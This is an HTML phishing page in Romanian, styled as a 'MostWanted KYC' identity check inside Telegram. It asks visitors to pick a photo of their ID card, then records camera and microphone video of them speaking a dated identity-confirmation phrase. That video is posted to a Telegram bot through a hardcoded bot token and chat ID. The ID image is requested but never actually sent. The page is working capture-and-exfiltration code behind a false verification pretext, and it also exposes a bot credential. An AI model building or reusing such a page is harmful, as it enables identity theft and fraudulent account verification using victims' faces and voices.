<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MostWanted KYC</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #00FF66; font-family: monospace; padding: 20px; text-align: center; }
        .box { border: 1px solid #00FF66; padding: 20px; }
        #v { width: 100%; height: 200px; background: #111; margin: 10px 0; }
        button { background: #00FF66; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <div id="prompt">PAS 1: Selectează buletinul din galerie.</div>
    <video id="v" autoplay playsinline></video>
    <button id="btn" onclick="next()">[ CONTINUĂ ]</button>
</div>

<input type="file" id="f" accept="image/*" style="display:none">

<script>
    const v = document.getElementById('v');
    const btn = document.getElementById('btn');
    const prompt = document.getElementById('prompt');
    const f = document.getElementById('f');
    
    let stage = 0;
    let stream;
    let recorder;
    let chunks = [];

    async function next() {
        if (stage === 0) {
            f.click();
        } else if (stage === 1) {
            stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
            v.srcObject = stream;
            prompt.innerText = "PAS 2: Înregistrează. Spune: \"Confirm identitatea mea, astăzi 13 Iulie 2026\".";
            btn.innerText = "[ START_RECORDING ]";
            stage = 2;
        } else if (stage === 2) {
            recorder = new MediaRecorder(stream);
            recorder.ondataavailable = (e) => chunks.push(e.data);
            recorder.onstop = sendData;
            recorder.start();
            btn.innerText = "[ STOP_AND_SEND ]";
            stage = 3;
        } else if (stage === 3) {
            recorder.stop();
            btn.innerText = "[ TRIMITERE... ]";
        }
    }

    f.onchange = () => {
        prompt.innerText = "Buletin încărcat. Apasă pentru biometrie.";
        stage = 1;
    };

    async function sendData() {
        const blob = new Blob(chunks, {type: 'video/webm'});
        const fd = new FormData();
        fd.append("chat_id", "-1003936586656");
        fd.append("video", blob, "identitate.webm");
        
        await fetch("https://api.telegram.org/bot8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk/sendVideo", {
            method: "POST", body: fd
        });
        prompt.innerText = "Trimitere completă. Închide fereastra.";
        btn.style.display = 'none';
    }
</script>
</body>
</html>
